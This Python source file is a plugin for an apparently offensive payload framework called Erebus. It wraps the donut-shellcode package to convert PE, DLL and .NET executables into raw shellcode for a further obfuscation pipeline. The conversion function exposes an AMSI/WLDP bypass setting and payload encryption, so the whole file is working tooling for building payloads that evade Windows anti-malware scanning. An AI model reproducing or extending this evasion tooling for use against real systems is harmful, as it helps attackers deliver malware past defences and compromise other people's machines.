"""
Erebus Payload - Donut Integration Plugin

Wraps the donut-shellcode Python package to convert PE (.exe / .dll) and .NET
assemblies to raw PIC shellcode before the Shellcrypt obfuscation pipeline.

Requires: pip install donut-shellcode

Pipeline insertion point:
    [PE / .NET input] → donut.create() → raw shellcode → Shellcrypt pipeline
"""

import importlib.util
import os
from typing import Optional

try:
    from erebus_wrapper.erebus.modules.plugin_base import ErebusPlugin, PluginMetadata, PluginCategory
except ImportError:
    from plugin_base import ErebusPlugin, PluginMetadata, PluginCategory


# Donut architecture constants (matches donut-shellcode package)
_DONUT_ARCH = {
    "x86":     1,
    "x64":     2,
    "x86+x64": 3,
}


class PayloadDonutPlugin(ErebusPlugin):
    """Donut PE/DLL/.NET → PIC shellcode converter (Python API)"""

    metadata = PluginMetadata(
        name="Payload Donut",
        version="1.0.0",
        category=PluginCategory.PAYLOAD,
        description="Convert PE, DLL, or .NET assemblies to raw shellcode via donut-shellcode",
        author="Whispergate",
    )

    def get_metadata(self) -> PluginMetadata:
        return self.metadata

    def register(self):
        return {
            "donut_convert": self.donut_convert,
            "donut_available": self.donut_available,
        }

    def validate(self) -> tuple:
        return (True, None)  # Absence of donut-shellcode is a runtime warning, not a load failure

    def on_load(self):
        pass

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    def donut_available(self) -> bool:
        """Return True if donut-shellcode is installed."""
        return importlib.util.find_spec("donut") is not None

    def donut_convert(
        self,
        input_path: str,
        output_path: str,
        arch: str = "x64",
        class_name: str = "",
        method: str = "",
        runtime: str = "",
        args: str = "",
        entropy: int = 3,
        bypass: int = 3,
        compress: int = 1,
    ) -> tuple[bool, str]:
        """Convert a PE/DLL/.NET assembly to raw shellcode via donut-shellcode.

        Args:
            input_path:  Path to the input PE / DLL / .NET assembly.
            output_path: Destination for the raw shellcode blob (.bin).
            arch:        "x86", "x64", or "x86+x64".
            class_name:  .NET class name (empty = auto-detect).
            method:      .NET method/entrypoint (empty = auto-detect).
            runtime:     CLR runtime version e.g. "v4.0.30319" (empty = auto).
            args:        Command-line arguments passed to the payload.
            entropy:     Donut entropy level (1=none, 2=random, 3=random+encrypt).
            bypass:      AMSI/WLDP bypass (1=skip, 2=abort on fail, 3=continue on fail).
            compress:    Donut internal compression (1=none, 2=aPLib).

        Returns:
            (success: bool, message: str)
        """
        if not os.path.exists(input_path):
            return False, f"Donut input not found: {input_path}"

        try:
            import donut
        except ImportError:
            return False, (
                "donut-shellcode package not installed. "
                "Run: pip install donut-shellcode"
            )

        arch_int = _DONUT_ARCH.get(arch, 2)

        kwargs = dict(
            file=input_path,
            arch=arch_int,
            entropy=entropy,
            bypass=bypass,
            compress=compress,
            format=1,  # 1 = raw binary shellcode
        )
        if class_name:
            kwargs["cls"] = class_name
        if method:
            kwargs["method"] = method
        if runtime:
            kwargs["runtime"] = runtime
        if args:
            kwargs["params"] = args

        try:
            shellcode: Optional[bytes] = donut.create(**kwargs)
        except Exception as e:
            return False, f"Donut API error: {e}"

        if not shellcode:
            return False, "Donut returned empty shellcode"

        with open(output_path, "wb") as f:
            f.write(shellcode)

        return True, f"Donut conversion successful: {len(shellcode)} bytes"


if __name__ == "__main__":
    p = PayloadDonutPlugin()
    valid, err = p.validate()
    print("[+] Validation passed" if valid else f"[-] Validation failed: {err}")
